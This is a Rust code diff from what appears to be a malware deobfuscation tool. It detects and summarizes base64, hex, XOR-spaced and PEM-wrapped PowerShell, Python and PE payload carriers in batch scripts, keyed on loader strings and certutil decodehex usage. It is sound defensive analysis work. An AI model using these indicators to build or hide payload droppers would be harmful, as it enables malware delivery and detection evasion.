+    replacement.push_str(&format!(
+        "rem omitted self-tail spaced PowerShell payload ({} bytes encoded, {} bytes decoded)",
+        trimmed.len(),
+        decoded.len()
+    ));
+    replacement.push_str(newline);
+    lines[idx] = replacement.as_str();
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    for line in lines {
+        out.push_str(line);
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: body.len() as u64,
+    });
+    Some(out)
+}
+
+fn decode_self_tail_spaced_xor_utf16_stage(decoded: &[u8]) -> Option<Vec<u8>> {
+    // A spaced byte lane means the original UTF-16LE high bytes were XORed
+    // from zero to ASCII spaces. That uniquely identifies the 0x20 key.
+    let xored: Vec<u8> = decoded.iter().map(|byte| byte ^ 0x20).collect();
+    let stage = decode_likely_powershell_payload(&xored);
+    let stage_lower = stage.to_ascii_lowercase();
+    if !stage_lower.contains("function")
+        || !stage_lower.contains("deflatestream")
+        || !stage_lower.contains("assembly]::load")
+    {
+        return None;
+    }
+    Some(stage.into_bytes())
+}
+
+fn summarize_tail_base64_powershell_payload(text: &str, env: &mut Environment) -> Option<String> {
+    let mut lines: Vec<&str> = text.split_inclusive('\n').collect();
+    if lines.is_empty() {
+        return None;
+    }
+
+    let (idx, body, newline) = lines.iter().enumerate().rev().find_map(|(idx, line)| {
+        let (body, newline) = split_line_ending(line);
+        (!body.trim().is_empty()).then_some((idx, body, newline))
+    })?;
+    let trimmed = body.trim();
+    if trimmed.len() < 4096 || !trimmed.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+
+    let decoded =
+        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, trimmed).ok()?;
+    if decoded.len() > 12 * 1024 * 1024 || !looks_like_tail_base64_script_payload(&decoded) {
+        return None;
+    }
+    let payload_kind = tail_base64_payload_kind(&decoded);
+
+    let leading_len = body.find(trimmed).unwrap_or(0);
+    let mut replacement = String::new();
+    replacement.push_str(&body[..leading_len]);
+    replacement.push_str(&format!(
+        "rem omitted tail base64 {payload_kind} payload ({} bytes encoded, {} bytes decoded)",
+        trimmed.len(),
+        decoded.len()
+    ));
+    replacement.push_str(newline);
+    lines[idx] = replacement.as_str();
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    for line in lines {
+        out.push_str(line);
+    }
+    let extracted = peel_tail_base64_powershell_wrapper(&decoded).unwrap_or(decoded);
+    queue_tail_base64_script_payload(extracted.clone(), env);
+    rescue_truncated_urls(&String::from_utf8_lossy(&extracted), body.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: body.len() as u64,
+    });
+    Some(out)
+}
+
+fn looks_like_tail_base64_script_payload(bytes: &[u8]) -> bool {
+    looks_like_powershell_payload_bytes(bytes) || looks_like_python_payload_bytes(bytes)
+}
+
+fn tail_base64_payload_kind(bytes: &[u8]) -> &'static str {
+    let text = String::from_utf8_lossy(bytes);
+    if looks_like_python_payload_text(&text) && !looks_like_strong_powershell_stage_bytes(bytes) {
+        "Python script"
+    } else {
+        "PowerShell"
+    }
+}
+
+fn queue_tail_base64_script_payload(payload: Vec<u8>, env: &mut Environment) {
+    let text = String::from_utf8_lossy(&payload).into_owned();
+    if looks_like_python_payload_text(&text) && !looks_like_strong_powershell_stage_bytes(&payload)
+    {
+        push_recovered_pe_artifact(env, "tail-base64-python", payload);
+        deob_scan::scan_deob_text(&text, env);
+    } else {
+        push_extracted_ps1_for_later_analysis(payload, env);
+    }
+}
+
+fn peel_tail_base64_powershell_wrapper(decoded: &[u8]) -> Option<Vec<u8>> {
+    let text = String::from_utf8_lossy(decoded);
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("gzipstream") || !lower.contains("frombase64string") {
+        return None;
+    }
+
+    let gz_b64 = first_quoted_base64_with_prefix(&text, "H4sI", 128, 4 * 1024 * 1024)?;
+    use base64::Engine as _;
+    let gz = base64::engine::general_purpose::STANDARD
+        .decode(gz_b64)
+        .ok()?;
+    let inflated = crate::aes_chain::crypto::gunzip(&gz, 4 * 1024 * 1024).ok()?;
+    peel_long_base64_powershell_assignment(&inflated).or(Some(inflated))
+}
+
+fn peel_long_base64_powershell_assignment(decoded: &[u8]) -> Option<Vec<u8>> {
+    let text = String::from_utf8_lossy(decoded);
+    if !crate::util::contains_ascii_case_insensitive(&text, "frombase64string") {
+        return None;
+    }
+    let b64 = first_quoted_base64_with_prefix(&text, "", 4096, 4 * 1024 * 1024)?;
+    use base64::Engine as _;
+    let inner = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
+    (inner.len() <= 4 * 1024 * 1024 && looks_like_strong_powershell_stage_bytes(&inner))
+        .then_some(inner)
+}
+
+fn looks_like_strong_powershell_stage_bytes(bytes: &[u8]) -> bool {
+    if !looks_like_powershell_payload_bytes(bytes) {
+        return false;
+    }
+    let text = String::from_utf8_lossy(bytes);
+    let lower = text.to_ascii_lowercase();
+    lower.contains('$')
+        && (lower.contains("new-object")
+            || lower.contains("add-type")
+            || lower.contains("invoke-")
+            || lower.contains("start-sleep")
+            || lower.contains("frombase64string")
+            || lower.contains("system.diagnostics.process"))
+}
+
+fn first_quoted_base64_with_prefix<'a>(
+    text: &'a str,
+    prefix: &str,
+    min_len: usize,
+    max_len: usize,
+) -> Option<&'a str> {
+    for quote in ['"', '\''] {
+        let needle = format!("{quote}{prefix}");
+        let mut cursor = 0usize;
+        while let Some(rel) = text[cursor..].find(&needle) {
+            let start = cursor + rel + quote.len_utf8();
+            let rest = &text[start..];
+            let end_rel = rest.find(quote)?;
+            let candidate = &rest[..end_rel];
+            if (min_len..=max_len).contains(&candidate.len())
+                && candidate.bytes().all(is_base64_carrier_byte)
+            {
+                return Some(candidate);
+            }
+            cursor = start
+                .saturating_add(end_rel)
+                .saturating_add(quote.len_utf8());
+        }
+    }
+    None
+}
+
+fn decoded_spaced_ascii_even_lane(decoded: &[u8]) -> Option<Vec<u8>> {
+    if decoded.len() < 128 || decoded.len() % 2 != 0 {
+        return None;
+    }
+    let odd_spaces = decoded
+        .iter()
+        .skip(1)
+        .step_by(2)
+        .filter(|b| **b == b' ')
+        .count();
+    let pairs = decoded.len() / 2;
+    if odd_spaces * 100 < pairs * 90 {
+        return None;
+    }
+    Some(decoded.iter().step_by(2).copied().collect())
+}
+
+fn looks_like_spaced_powershell_loader(bytes: &[u8]) -> bool {
+    let text: String = bytes
+        .iter()
+        .map(|b| {
+            if matches!(*b, b'\t' | b'\n' | b'\r' | 0x20..=0x7e) {
+                *b as char
+            } else {
+                ' '
+            }
+        })
+        .collect();
+    let lower = text.to_ascii_lowercase();
+    lower.contains("function")
+        && lower.contains("decompressbuffer")
+        && lower.contains("deflatestream")
+        && lower.contains("loadassembly")
+}
+
+fn summarize_echo_base64_redirect_runs_after_materialization(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    summarize_echo_base64_redirect_runs(text, env, true)
+}
+
+fn summarize_echo_base64_redirect_runs(
+    text: &str,
+    env: &mut Environment,
+    summarize_non_pe: bool,
+) -> Option<String> {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending_lines: Vec<&str> = Vec::new();
+    let mut pending_payloads: Vec<&str> = Vec::new();
+    let mut pending_target: Option<String> = None;
+    let mut grouped_lines: Vec<&str> = Vec::new();
+    let mut grouped_payloads: Vec<&str> = Vec::new();
+    let mut grouped_target: Option<String> = None;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        if !grouped_lines.is_empty() {
+            if let Some(close_target) = parse_grouped_echo_base64_redirect_close(line) {
+                grouped_lines.push(line);
+                let target = close_target
+                    .or_else(|| grouped_target.take())
+                    .unwrap_or_default();
+                changed |= flush_grouped_echo_base64_pe_redirect_run(
+                    &mut out,
+                    &mut grouped_lines,
+                    &mut grouped_payloads,
+                    target,
+                    env,
+                    summarize_non_pe,
+                );
+                continue;
+            }
+            if let Some(payload) = parse_grouped_echo_base64_stdout_line(line) {
+                grouped_lines.push(line);
+                grouped_payloads.push(payload);
+                continue;
+            }
+            if is_grouped_echo_base64_boundary_or_blank_line(line) {
+                grouped_lines.push(line);
+                continue;
+            }
+            if split_line_ending(line).0.trim().is_empty() {
+                grouped_lines.push(line);
+                continue;
+            }
+            for grouped_line in grouped_lines.drain(..) {
+                out.push_str(grouped_line);
+            }
+            grouped_payloads.clear();
+            grouped_target = None;
+        }
+
+        if let Some(target) = parse_grouped_echo_base64_redirect_open(line) {
+            grouped_lines.push(line);
+            grouped_target = target;
+            continue;
+        }
+
+        if let Some((payload, target)) = parse_echo_base64_redirect_line(line) {
+            let same_target = pending_target
+                .as_deref()
+                .map_or(true, |current| current == target);
+            if same_target {
+                pending_target.get_or_insert(target);
+                pending_lines.push(line);
+                pending_payloads.push(payload);
+                continue;
+            }
+        }
+
+        changed |= flush_echo_base64_pe_redirect_run(
+            &mut out,
+            &mut pending_lines,
+            &mut pending_payloads,
+            &mut pending_target,
+            env,
+            summarize_non_pe,
+        );
+        out.push_str(line);
+    }
+
+    changed |= flush_echo_base64_pe_redirect_run(
+        &mut out,
+        &mut pending_lines,
+        &mut pending_payloads,
+        &mut pending_target,
+        env,
+        summarize_non_pe,
+    );
+    for grouped_line in grouped_lines.drain(..) {
+        out.push_str(grouped_line);
+    }
+
+    changed.then_some(out)
+}
+
+fn parse_grouped_echo_base64_redirect_open(line: &str) -> Option<Option<String>> {
+    let (body, _) = split_line_ending(line);
+    let trimmed = body.trim_start_matches(['@', ' ', '\t']).trim_end();
+    if trimmed == "(" {
+        return Some(None);
+    }
+    let before_paren = trimmed.strip_suffix('(')?.trim_end();
+    if before_paren.is_empty() {
+        return Some(None);
+    }
+    if let Some(target) = parse_prefix_grouped_stdout_redirect_target(before_paren) {
+        return Some(Some(target));
+    }
+    let (_, redir) = crate::redirect::extract_redirections(before_paren);
+    redir.stdout.map(|target| Some(target.path().to_string()))
+}
+
+fn parse_prefix_grouped_stdout_redirect_target(text: &str) -> Option<String> {
+    let trimmed = text.trim_start();
+    let after_op = if let Some(rest) = trimmed.strip_prefix("1>>") {
+        rest
+    } else if let Some(rest) = trimmed.strip_prefix(">>") {
+        rest
+    } else if let Some(rest) = trimmed.strip_prefix("1>") {
+        rest
+    } else if let Some(rest) = trimmed.strip_prefix('>') {
+        rest
+    } else {
+        return None;
+    };
+    let target = after_op.trim_start();
+    if target.is_empty() {
+        return None;
+    }
+    if let Some(rest) = target.strip_prefix('"') {
+        let end = rest.find('"')?;
+        return Some(rest[..end].to_string());
+    }
+    if let Some(rest) = target.strip_prefix('\'') {
+        let end = rest.find('\'')?;
+        return Some(rest[..end].to_string());
+    }
+    let end = target
+        .find(|c: char| c.is_whitespace() || matches!(c, '|' | '&' | '<' | '>'))
+        .unwrap_or(target.len());
+    (end > 0).then(|| target[..end].to_string())
+}
+
+fn parse_grouped_echo_base64_redirect_close(line: &str) -> Option<Option<String>> {
+    let (body, _) = split_line_ending(line);
+    let trimmed = body.trim_start_matches(['@', ' ', '\t']);
+    let after_paren = trimmed.strip_prefix(')')?.trim_start();
+    if after_paren.is_empty() {
+        return Some(None);
+    }
+    let (_, redir) = crate::redirect::extract_redirections(after_paren);
+    redir.stdout.map(|target| Some(target.path().to_string()))
+}
+
+fn parse_grouped_echo_base64_stdout_line(line: &str) -> Option<&str> {
+    let (body, _) = split_line_ending(line);
+    if body.contains('>') {
+        return None;
+    }
+    let trimmed = body.trim_start_matches(['@', ' ', '\t']);
+    let payload = block_echo_payload(trimmed)?;
+    let payload = payload.trim();
+    if payload.is_empty() || !looks_like_base64_carrier_fragment(payload) {
+        return None;
+    }
+    Some(payload)
+}
+
+fn is_grouped_echo_base64_boundary_or_blank_line(line: &str) -> bool {
+    let (body, _) = split_line_ending(line);
+    if body.contains('>') {
+        return false;
+    }
+    let trimmed = body.trim_start_matches(['@', ' ', '\t']);
+    let Some(payload) = block_echo_payload(trimmed) else {
+        return false;
+    };
+    let payload = payload.trim();
+    payload.is_empty()
+        || payload.eq_ignore_ascii_case("-----BEGIN CERTIFICATE-----")
+        || payload.eq_ignore_ascii_case("-----END CERTIFICATE-----")
+}
+
+fn parse_echo_base64_redirect_line(line: &str) -> Option<(&str, String)> {
+    let (body, _) = split_line_ending(line);
+    let mut in_double = false;
+    let mut in_single = false;
+    let mut op_start = None;
+    let bytes = body.as_bytes();
+    for (idx, c) in body.char_indices() {
+        match c {
+            '"' if !in_single => in_double = !in_double,
+            '\'' if !in_double => in_single = !in_single,
+            '>' if !in_double && !in_single => op_start = Some(idx),
+            _ => {}
+        }
+    }
+    let op = op_start?;
+    if op == 0 {
+        return None;
+    }
+    let append = bytes.get(op.wrapping_sub(1)) == Some(&b'>');
+    let content_end = if append { op - 1 } else { op };
+    let before_op = body[..content_end].trim_end();
+    let mut target = body[op + 1..].trim_start();
+    if target.is_empty() {
+        return None;
+    }
+    if let Some(rest) = target.strip_prefix('"') {
+        let end = rest.find('"')?;
+        target = &rest[..end];
+    } else if let Some(rest) = target.strip_prefix('\'') {
+        let end = rest.find('\'')?;
+        target = &rest[..end];
+    } else {
+        target = target
+            .split(|c: char| c.is_whitespace() || matches!(c, '|' | '&' | '<' | '>'))
+            .next()
+            .unwrap_or("");
+    }
+    if target.is_empty() {
+        return None;
+    }
+
+    let trimmed = before_op.trim_start();
+    let trimmed = trimmed.strip_prefix('@').unwrap_or(trimmed).trim_start();
+    let echo_body = trimmed
+        .get(..4)
+        .filter(|prefix| prefix.eq_ignore_ascii_case("echo"))
+        .map(|_| &trimmed[4..])?;
+    let payload = echo_body
+        .strip_prefix(['.', ':', '/', '('])
+        .unwrap_or(echo_body)
+        .trim();
+    if payload.len() < 16 || !looks_like_base64_carrier_fragment(payload) {
+        return None;
+    }
+    Some((payload, target.to_string()))
+}
+
+fn looks_like_base64_carrier_fragment(payload: &str) -> bool {
+    const FULL_VALIDATE_MAX_BYTES: usize = 256;
+    const SAMPLE_BYTES: usize = 64;
+
+    if payload.is_empty() {
+        return false;
+    }
+    if payload.len() <= FULL_VALIDATE_MAX_BYTES {
+        return payload.bytes().all(is_base64_carrier_byte);
+    }
+    payload
+        .as_bytes()
+        .iter()
+        .take(SAMPLE_BYTES)
+        .chain(payload.as_bytes().iter().rev().take(SAMPLE_BYTES))
+        .all(|byte| is_base64_carrier_byte(*byte))
+}
+
+fn flush_grouped_echo_base64_pe_redirect_run(
+    out: &mut String,
+    grouped_lines: &mut Vec<&str>,
+    grouped_payloads: &mut Vec<&str>,
+    target: String,
+    env: &mut Environment,
+    summarize_non_pe: bool,
+) -> bool {
+    if grouped_payloads.is_empty() {
+        for line in grouped_lines.drain(..) {
+            out.push_str(line);
+        }
+        return false;
+    }
+
+    let total_len: usize = grouped_payloads.iter().map(|line| line.len()).sum();
+    let mut pe_passthrough = false;
+    if should_attempt_echo_redirect_base64_pe_decode(total_len, grouped_lines.len()) {
+        if let Some((label_kind, pe)) = decode_nested_base64_pe_carrier_block(grouped_payloads) {
+            if !should_summarize_echo_redirect_base64_pe_carrier(total_len, grouped_lines.len()) {
+                pe_passthrough = true;
+            } else {
+                let pe_len = pe.len();
+                if push_recovered_pe_artifact(env, label_kind, pe.clone()) {
+                    scan_binary_input_urls(&pe, env);
+                }
+                prune_echo_redirect_carrier_traits(&target, env);
+                let original_len: usize = grouped_lines.iter().map(|line| line.len()).sum();
+                env.traits.push(crate::traits::Trait::LineTruncated {
+                    original_len: original_len as u64,
+                });
+                out.push_str(&format!(
+                "rem omitted grouped echo-redirect base64 PE carrier to {} ({} lines, {} base64 bytes, {} bytes recovered)\r\n",
+                target,
+                grouped_payloads.len(),
+                total_len,
+                pe_len
+            ));
+                grouped_lines.clear();
+                grouped_payloads.clear();
+                return true;
+            }
+        }
+    }
+    if !pe_passthrough
+        && should_summarize_non_pe_echo_redirect_base64(
+            total_len,
+            grouped_lines.len(),
+            summarize_non_pe,
+        )
+        && !looks_like_echo_redirect_hex_carrier(grouped_payloads)
+    {
+        let decoded_len = maybe_queue_echo_redirect_decoded_payload(grouped_payloads, env);
+        let original_len: usize = grouped_lines.iter().map(|line| line.len()).sum();
+        prune_echo_redirect_carrier_traits(&target, env);
+        push_summarized_echo_redirect_trait(&target, total_len, env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: original_len as u64,
+        });
+        if let Some(decoded_len) = decoded_len {
+            out.push_str(&format!(
+                "rem omitted grouped echo-redirect base64 PowerShell payload to {} ({} lines, {} base64 bytes, {} decoded bytes)\r\n",
+                target,
+                grouped_payloads.len(),
+                total_len,
+                decoded_len
+            ));
+        } else {
+            let padding = grouped_payloads
+                .last()
+                .map(|line| line.bytes().rev().take_while(|b| *b == b'=').count())
+                .unwrap_or(0);
+            let decoded_estimate = (total_len / 4).saturating_mul(3).saturating_sub(padding);
+            out.push_str(&format!(
+                "rem omitted grouped echo-redirect base64 carrier to {} ({} lines, {} base64 bytes, ~{} decoded bytes)\r\n",
+                target,
+                grouped_payloads.len(),
+                total_len,
+                decoded_estimate
+            ));
+        }
+        grouped_lines.clear();
+        grouped_payloads.clear();
+        return true;
+    }
+
+    for line in grouped_lines.drain(..) {
+        out.push_str(line);
+    }
+    grouped_payloads.clear();
+    false
+}
+
+fn flush_echo_base64_pe_redirect_run(
+    out: &mut String,
+    pending_lines: &mut Vec<&str>,
+    pending_payloads: &mut Vec<&str>,
+    pending_target: &mut Option<String>,
+    env: &mut Environment,
+    summarize_non_pe: bool,
+) -> bool {
+    if pending_lines.is_empty() {
+        return false;
+    }
+
+    let total_len: usize = pending_payloads.iter().map(|line| line.len()).sum();
+    let target = pending_target.take().unwrap_or_default();
+    let mut pe_passthrough = false;
+    if should_attempt_echo_redirect_base64_pe_decode(total_len, pending_lines.len()) {
+        if let Some((label_kind, pe)) = decode_nested_base64_pe_carrier_block(pending_payloads) {
+            if !should_summarize_echo_redirect_base64_pe_carrier(total_len, pending_lines.len()) {
+                pe_passthrough = true;
+            } else {
+                let pe_len = pe.len();
+                if push_recovered_pe_artifact(env, label_kind, pe.clone()) {
+                    scan_binary_input_urls(&pe, env);
+                }
+                prune_echo_redirect_carrier_traits(&target, env);
+                let original_len: usize = pending_lines.iter().map(|line| line.len()).sum();
+                env.traits.push(crate::traits::Trait::LineTruncated {
+                    original_len: original_len as u64,
+                });
+                out.push_str(&format!(
+                "rem omitted echo-redirect base64 PE carrier to {} ({} lines, {} base64 bytes, {} bytes recovered)\r\n",
+                target,
+                pending_lines.len(),
+                total_len,
+                pe_len
+            ));
+                pending_lines.clear();
+                pending_payloads.clear();
+                return true;
+            }
+        }
+    }
+    if !pe_passthrough
+        && should_summarize_non_pe_echo_redirect_base64(
+            total_len,
+            pending_lines.len(),
+            summarize_non_pe,
+        )
+        && !looks_like_echo_redirect_hex_carrier(pending_payloads)
+    {
+        let decoded_len = maybe_queue_echo_redirect_decoded_payload(pending_payloads, env);
+        let original_len: usize = pending_lines.iter().map(|line| line.len()).sum();
+        prune_echo_redirect_carrier_traits(&target, env);
+        push_summarized_echo_redirect_trait(&target, total_len, env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: original_len as u64,
+        });
+        if let Some(decoded_len) = decoded_len {
+            out.push_str(&format!(
+                "rem omitted echo-redirect base64 PowerShell payload to {} ({} lines, {} base64 bytes, {} decoded bytes)\r\n",
+                target,
+                pending_lines.len(),
+                total_len,
+                decoded_len
+            ));
+        } else {
+            let padding = pending_payloads
+                .last()
+                .map(|line| line.bytes().rev().take_while(|b| *b == b'=').count())
+                .unwrap_or(0);
+            let decoded_estimate = (total_len / 4).saturating_mul(3).saturating_sub(padding);
+            out.push_str(&format!(
+                "rem omitted echo-redirect base64 carrier to {} ({} lines, {} base64 bytes, ~{} decoded bytes)\r\n",
+                target,
+                pending_lines.len(),
+                total_len,
+                decoded_estimate
+            ));
+        }
+        pending_lines.clear();
+        pending_payloads.clear();
+        return true;
+    }
+
+    for line in pending_lines.drain(..) {
+        out.push_str(line);
+    }
+    pending_payloads.clear();
+    false
+}
+
+fn should_attempt_echo_redirect_base64_pe_decode(total_len: usize, line_count: usize) -> bool {
+    const MIN_MULTI_LINE_B64_BYTES: usize = 4096;
+    const MIN_SINGLE_LINE_B64_BYTES: usize = 1024;
+
+    total_len >= MIN_MULTI_LINE_B64_BYTES
+        || (line_count == 1 && total_len >= MIN_SINGLE_LINE_B64_BYTES)
+}
+
+fn should_summarize_echo_redirect_base64_pe_carrier(total_len: usize, line_count: usize) -> bool {
+    const MIN_MULTI_LINE_B64_BYTES: usize = 4096;
+
+    line_count >= 2 || total_len >= MIN_MULTI_LINE_B64_BYTES
+}
+
+fn should_summarize_non_pe_echo_redirect_base64(
+    total_len: usize,
+    line_count: usize,
+    summarize_non_pe: bool,
+) -> bool {
+    const MIN_MULTI_LINE_B64_BYTES: usize = 4096;
+    const MIN_SINGLE_LINE_B64_BYTES: usize = 1024;
+
+    summarize_non_pe
+        && ((line_count >= 3 && total_len >= MIN_MULTI_LINE_B64_BYTES)
+            || (line_count == 1 && total_len >= MIN_SINGLE_LINE_B64_BYTES))
+}
+
+fn push_summarized_echo_redirect_trait(target: &str, total_len: usize, env: &mut Environment) {
+    let content =
+        format!("rem omitted echo-redirect base64 carrier ({total_len} bytes)\r\n").into_bytes();
+    env.traits.push(crate::traits::Trait::EchoRedirect {
+        content,
+        target: target.to_string(),
+        append: true,
+    });
+}
+
+fn prune_echo_redirect_carrier_traits(target: &str, env: &mut Environment) {
+    if target.is_empty() {
+        return;
+    }
+    env.traits.retain(|trait_| {
+        !matches!(
+            trait_,
+            crate::traits::Trait::EchoRedirect {
+                content,
+                target: trait_target,
+                ..
+            } if trait_target.eq_ignore_ascii_case(target)
+                && echo_redirect_content_is_base64_carrier(content)
+        )
+    });
+}
+
+fn echo_redirect_content_is_base64_carrier(content: &[u8]) -> bool {
+    let body = trim_ascii_ws_bytes(content);
+    body.len() >= 64 && body.iter().copied().all(is_base64_carrier_byte)
+}
+
+fn trim_ascii_ws_bytes(mut bytes: &[u8]) -> &[u8] {
+    while bytes.first().is_some_and(u8::is_ascii_whitespace) {
+        bytes = &bytes[1..];
+    }
+    while bytes.last().is_some_and(u8::is_ascii_whitespace) {
+        bytes = &bytes[..bytes.len() - 1];
+    }
+    bytes
+}
+
+fn looks_like_echo_redirect_hex_carrier<S: AsRef<str>>(payloads: &[S]) -> bool {
+    let mut total = 0usize;
+    for payload in payloads {
+        let payload = payload.as_ref();
+        if payload.is_empty() || payload.len() % 2 != 0 {
+            return false;
+        }
+        if !payload.bytes().all(|b| b.is_ascii_hexdigit()) {
+            return false;
+        }
+        total += payload.len();
+    }
+    total >= 4096
+}
+
+fn summarize_grouped_echo_decodehex_carriers(text: &str, env: &mut Environment) -> Option<String> {
+    if !contains_ascii_case_insensitive_bytes(text.as_bytes(), b"decodehex") {
+        return None;
+    }
+
+    let lines: Vec<&str> = text.split_inclusive('\n').collect();
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    let mut idx = 0usize;
+
+    while idx < lines.len() {
+        let Some(open_target) = parse_grouped_echo_base64_redirect_open(lines[idx]) else {
+            out.push_str(lines[idx]);
+            idx += 1;
+            continue;
+        };
+
+        let start = idx;
+        idx += 1;
+        let mut payloads = Vec::new();
+        let mut close_idx = None;
+        let mut target = open_target;
+
+        while idx < lines.len() {
+            if let Some(payload) = parse_grouped_echo_hex_stdout_line(lines[idx]) {
+                payloads.push(payload);
+                idx += 1;
+                continue;
+            }
+
+            if let Some(close_target) = parse_grouped_echo_base64_redirect_close(lines[idx]) {
+                if close_target.is_some() {
+                    target = close_target;
+                }
+                close_idx = Some(idx);
+                idx += 1;
+            }
+            break;
+        }
+
+        let Some(close_idx) = close_idx else {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+            }
+            continue;
+        };
+        let Some(target) = target.as_deref() else {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+            }
+            continue;
+        };
+        let Some(next_line) = lines.get(idx) else {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+            }
+            continue;
+        };
+        let Some(src) = certutil_decodehex_source(next_line) else {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+            }
+            continue;
+        };
+        if !same_redirect_target(&src, target) || !looks_like_echo_redirect_hex_carrier(&payloads) {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+            }
+            continue;
+        }
+
+        let total_hex_bytes: usize = payloads.iter().map(|payload| payload.len()).sum();
+        let original_len: usize = lines[start..=close_idx].iter().map(|line| line.len()).sum();
+        let mut joined = String::with_capacity(total_hex_bytes);
+        for payload in &payloads {
+            joined.push_str(payload);
+        }
+        let decoded = crate::handlers::certutil::decode_certutil_hex_text(&joined);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: original_len as u64,
+        });
+        if let Some(decoded) = decoded {
+            if looks_like_pe(&decoded) {
+                out.push_str(&format!(
+                    "rem omitted grouped echo-redirect hex PE carrier to {} ({} lines, {} hex bytes, {} bytes recovered)\r\n",
+                    target,
+                    payloads.len(),
+                    total_hex_bytes,
+                    decoded.len()
+                ));
+            } else {
+                out.push_str(&format!(
+                    "rem omitted grouped echo-redirect hex carrier to {} ({} lines, {} hex bytes, {} decoded bytes)\r\n",
+                    target,
+                    payloads.len(),
+                    total_hex_bytes,
+                    decoded.len()
+                ));
+            }
+        } else {
+            out.push_str(&format!(
+                "rem omitted grouped echo-redirect hex carrier to {} ({} lines, {} hex bytes)\r\n",
+                target,
+                payloads.len(),
+                total_hex_bytes
+            ));
+        }
+        changed = true;
+    }
+
+    changed.then_some(out)
+}
+
+fn parse_grouped_echo_hex_stdout_line(line: &str) -> Option<String> {
+    let (body, _) = split_line_ending(line);
+    if body.contains('>') {
+        return None;
+    }
+    let trimmed = body.trim_start_matches(['@', ' ', '\t']);
+    let payload = block_echo_payload(trimmed)?.trim();
+    if payload.len() < 16 || payload.len() % 2 != 0 {
+        return None;
+    }
+    payload
+        .bytes()
+        .all(|byte| byte.is_ascii_hexdigit())
+        .then(|| payload.to_string())
+}
+
+fn certutil_decodehex_source(line: &str) -> Option<String> {
+    let (body, _) = split_line_ending(line);
+    let lower = body.to_ascii_lowercase();
+    if !lower.contains("certutil") || !lower.contains("decodehex") {
+        return None;
+    }
+    let tokens = crate::handlers::util::split_words(body);
+    let flag = tokens
+        .iter()
+        .position(|token| certutil_decodehex_flag(token))?;
+    tokens
+        .iter()
+        .skip(flag + 1)
+        .find(|token| !certutil_decodehex_option(token))
+        .map(|token| crate::util::strip_outer_quotes(token).to_string())
+}
+
+fn certutil_decodehex_flag(token: &str) -> bool {
+    let token = crate::util::strip_outer_quotes(token);
+    token
+        .strip_prefix(['-', '/'])
+        .is_some_and(|flag| flag.eq_ignore_ascii_case("decodehex"))
+}
+
+fn certutil_decodehex_option(token: &str) -> bool {
+    let token = crate::util::strip_outer_quotes(token);
+    token
+        .strip_prefix(['-', '/'])
+        .is_some_and(|flag| !flag.is_empty())
+}
+
+fn same_redirect_target(left: &str, right: &str) -> bool {
+    let left = crate::util::strip_outer_quotes(left)
+        .trim()
+        .replace('/', "\\");
+    let right = crate::util::strip_outer_quotes(right)
+        .trim()
+        .replace('/', "\\");
+    left.eq_ignore_ascii_case(&right)
+}
+
+fn maybe_queue_echo_redirect_decoded_payload(
+    payloads: &[&str],
+    env: &mut Environment,
+) -> Option<usize> {
+    const MAX_DECODED_BYTES: usize = 12 * 1024 * 1024;
+
+    let total_len: usize = payloads.iter().map(|line| line.len()).sum();
+    if total_len > 16 * 1024 * 1024 {
+        return None;
+    }
+
+    let mut joined = String::with_capacity(total_len);
+    for payload in payloads {
+        joined.push_str(payload);
+    }
+    let decoded =
+        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, joined).ok()?;
+    if decoded.len() > MAX_DECODED_BYTES || !looks_like_powershell_payload_bytes(&decoded) {
+        return None;
+    }
+    let decoded_len = decoded.len();
+
+    if let Some(extracted) = peel_tail_base64_powershell_wrapper(&decoded) {
+        push_extracted_ps1_for_later_analysis(extracted.clone(), env);
+        rescue_truncated_urls(&String::from_utf8_lossy(&extracted), total_len, env);
+        return Some(decoded_len);
+    }
+
+    if decoded.len() <= MAX_DIRECT_EXTRACTED_PS1_BYTES {
+        rescue_truncated_urls(&String::from_utf8_lossy(&decoded), total_len, env);
+        env.push_extracted_ps1(decoded);
+    } else {
+        rescue_truncated_urls(&String::from_utf8_lossy(&decoded), total_len, env);
+        crate::ps1_scan::scan_large_ps1_payload_bytes_fast(&decoded, env);
+        push_extracted_ps1_for_later_analysis(decoded, env);
+    }
+    Some(decoded_len)
+}
+
+fn summarize_pem_pe_payload(text: &str, env: &mut Environment) -> Option<String> {
+    const BOUNDARIES: &[(&str, &str, &str, &str, bool)] = &[
+        (
+            "NEW CERTIFICATE REQUEST",
+            "new-certificate-request-pe",
+            "-----BEGIN NEW CERTIFICATE REQUEST-----",
+            "-----END NEW CERTIFICATE REQUEST-----",
+            false,
+        ),
+        (
+            "X509 CRL",
+            "x509-crl-pe",
+            "-----BEGIN X509 CRL-----",
+            "-----END X509 CRL-----",
+            false,
+        ),
+        (
+            "CERTIFICATE",
+            "certificate-pe",
+            "-----BEGIN CERTIFICATE-----",
+            "-----END CERTIFICATE-----",
+            true,
+        ),
+    ];
+
+    let lower = text.to_ascii_lowercase();
+    let has_explicit_certutil_decode = lower.contains("certutil") && lower.contains("-decode");
+
+    let mut found = None;
+    for (display, label, begin_marker, end_marker, allow_with_certutil) in BOUNDARIES {
+        if has_explicit_certutil_decode && !allow_with_certutil {
+            continue;
+        }
+        let mut search_start = 0usize;
+        while let Some(relative_begin) = text[search_start..].find(begin_marker) {
+            let begin = search_start + relative_begin;
+            let Some(relative_end) = text[begin..].find(end_marker) else {
+                break;
+            };
+            let end = begin + relative_end + end_marker.len();
